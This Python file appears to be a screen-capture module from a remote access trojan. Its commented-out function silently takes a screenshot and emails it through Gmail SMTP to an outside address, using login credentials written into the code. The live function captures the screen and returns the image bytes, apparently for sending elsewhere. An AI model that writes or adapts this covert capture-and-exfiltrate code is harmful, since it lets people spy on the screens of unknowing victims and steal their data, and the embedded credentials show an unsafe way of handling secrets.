# import smtplib
# from email.mime.multipart import MIMEMultipart
# from email.mime.text import MIMEText
# from email.mime.base import MIMEBase
# from email import encoders
# import pyscreenshot


# def screeshotEmail():
# 	pyscreenshot.grab_to_file('screenshot.jpg')
# 	fromaddr = "cvdrat@gmail.com"
# 	toaddr = "chetan.k2626@gmail.com"
# 	msg = MIMEMultipart()
# 	msg['From'] = fromaddr
# 	msg['To'] = toaddr
# 	msg['Subject'] = "SUBJECT OF THE EMAIL"
# 	body = "This is the screenshot"
# 	msg.attach(MIMEText(body, 'plain'))
# 	filename = "screenshot.jpg"
# 	attachment = open("screenshot.jpg", "rb")
# 	part = MIMEBase('application', 'octet-stream')
# 	part.set_payload((attachment).read())
# 	encoders.encode_base64(part)
# 	part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
# 	msg.attach(part)
# 	server = smtplib.SMTP('smtp.gmail.com', 587)
# 	server.starttls()
# 	server.login(fromaddr, "rat123rat123")
# 	text = msg.as_string()
# 	server.sendmail(fromaddr, toaddr, text)
# 	server.quit()

import pyscreenshot
import base64

def screeshotEmail():
	pyscreenshot.grab_to_file('screenshot.png')
	image = open('screenshot.png','rb')
	image_read = image.read()
	# return base64.encodestring(image_read)
	image.close()
	return image_read